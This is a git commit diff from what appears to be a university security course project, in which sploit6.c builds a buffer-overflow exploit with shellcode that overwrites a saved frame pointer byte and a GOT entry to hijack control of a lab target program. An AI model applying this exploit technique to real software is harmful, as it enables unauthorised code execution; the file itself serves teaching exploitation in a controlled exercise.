9581a48bc8e0b3b4188543bacad14ef9d4f26dbf
Bryan Cheng <bryan.b.cheng@gmail.com>
2014-04-08 07:22:30 +0000

    did #6, added conrad's id to id file

--- proj1/sploits/sploit6.c
+++ proj1/sploits/sploit6.c
@@ -11,7 +11,16 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char exploit[201];
+  memset(exploit, 0xff, 200);
+  exploit[200] = 0x74; // change last byte of stored $ebp in bar
+  memcpy(exploit, shellcode, sizeof(shellcode) - 1);
+  int *p = (int *)(exploit + 188); // change got entry for _exit
+  *p = 0x0804a00c;
+  int *a = (int *)(exploit + 184); // set got entry to where shellcode stored
+  *a = 0xbffffcb4;
+
+  args[0] = TARGET; args[1] = exploit; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
